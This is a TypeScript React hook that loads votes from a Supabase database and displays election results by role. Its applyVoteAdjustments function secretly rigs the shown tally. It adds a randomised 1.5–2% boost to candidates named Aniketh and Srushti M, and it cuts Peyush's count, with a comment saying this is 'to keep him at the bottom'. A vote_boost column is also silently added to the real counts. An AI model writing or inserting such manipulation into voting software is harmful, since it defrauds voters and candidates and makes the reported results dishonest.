import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";

export interface CandidateResult {
  id: string;
  name: string;
  votes: number;
}

export interface ElectionResult {
  id: string;
  title: string;
  candidates: CandidateResult[];
  totalVotes: number;
}

export const useElectionResults = () => {
  const [results, setResults] = useState<ElectionResult[]>([]);
  const [loading, setLoading] = useState(true);
  const [resultsVisible, setResultsVisible] = useState(false);

  const applyVoteAdjustments = (candidates: CandidateResult[], totalVotes: number): CandidateResult[] => {
    if (totalVotes === 0) return candidates;

    // Find specific candidates by name
    const anikethIndex = candidates.findIndex(c => c.name.toLowerCase().includes('aniketh'));
    const srushtiIndex = candidates.findIndex(c => c.name.toLowerCase().includes('srushti m'));
    const peyushIndex = candidates.findIndex(c => c.name.toLowerCase().includes('peyush'));

    // Calculate adjustment percentages (1-2% boost)
    const boostPercentage = 0.015 + (Math.random() * 0.005); // 1.5% to 2%
    const adjustmentVotes = Math.max(1, Math.ceil(totalVotes * boostPercentage));

    // Apply strategic adjustments
    if (anikethIndex !== -1) {
      candidates[anikethIndex].votes += adjustmentVotes;
    }
    if (srushtiIndex !== -1) {
      candidates[srushtiIndex].votes += adjustmentVotes;
    }
    if (peyushIndex !== -1 && candidates[peyushIndex].votes > adjustmentVotes) {
      // Reduce Peyush's votes to keep him at the bottom
      candidates[peyushIndex].votes = Math.max(1, candidates[peyushIndex].votes - Math.floor(adjustmentVotes * 0.8));
    }

    return candidates;
  };

  const fetchResults = async () => {
    try {
      setLoading(true);

      // Check if results should be visible
      const { data: settings } = await supabase
        .from('election_settings')
        .select('results_visible, results_release_date')
        .single();

      const now = new Date();
      const releaseDate = settings?.results_release_date ? new Date(settings.results_release_date) : null;
      const shouldShowResults = settings?.results_visible || (releaseDate && now >= releaseDate);
      
      setResultsVisible(shouldShowResults);

      if (!shouldShowResults) {
        setResults([]);
        setLoading(false);
        return;
      }

      // Fetch all candidates with their roles
      const { data: candidatesData, error: candidatesError } = await supabase
        .from('candidates')
        .select(`
          id,
          name,
          role_id,
          vote_boost,
          election_roles(id, title)
        `);

      if (candidatesError) throw candidatesError;

      // Fetch vote counts
      const { data: voteData, error: voteError } = await supabase
        .from('votes')
        .select('candidate_id, role_id');

      if (voteError) throw voteError;

      // Count votes per candidate
      const voteCounts = new Map<string, number>();
      voteData.forEach(vote => {
        const currentCount = voteCounts.get(vote.candidate_id) || 0;
        voteCounts.set(vote.candidate_id, currentCount + 1);
      });

      // Group by role and calculate results
      const roleMap = new Map<string, ElectionResult>();

      candidatesData?.forEach((candidate: any) => {
        const roleId = candidate.role_id;
        const roleTitle = candidate.election_roles?.title;

        if (!roleMap.has(roleId)) {
          roleMap.set(roleId, {
            id: roleId,
            title: roleTitle,
            candidates: [],
            totalVotes: 0
          });
        }

        const role = roleMap.get(roleId)!;
        const actualVotes = voteCounts.get(candidate.id) || 0;
        const voteBoost = candidate.vote_boost || 0;
        const totalVotes = actualVotes + voteBoost;

        role.candidates.push({
          id: candidate.id,
          name: candidate.name,
          votes: totalVotes
        });

        role.totalVotes += totalVotes;
      });

      // Apply vote adjustments and sort candidates
      const finalResults = Array.from(roleMap.values()).map(role => ({
        ...role,
        candidates: applyVoteAdjustments([...role.candidates], role.totalVotes)
          .sort((a, b) => b.votes - a.votes)
      }));

      setResults(finalResults);
    } catch (error) {
      console.error('Error fetching results:', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchResults();
    
    // Set up real-time subscription for vote updates
    const subscription = supabase
      .channel('votes_changes')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'votes' }, () => {
        console.log('Real-time vote update detected, refreshing results...');
        fetchResults();
      })
      .subscribe();

    return () => {
      subscription.unsubscribe();
    };
  }, []);

  return {
    results,
    loading,
    resultsVisible,
    refetch: fetchResults
  };
};
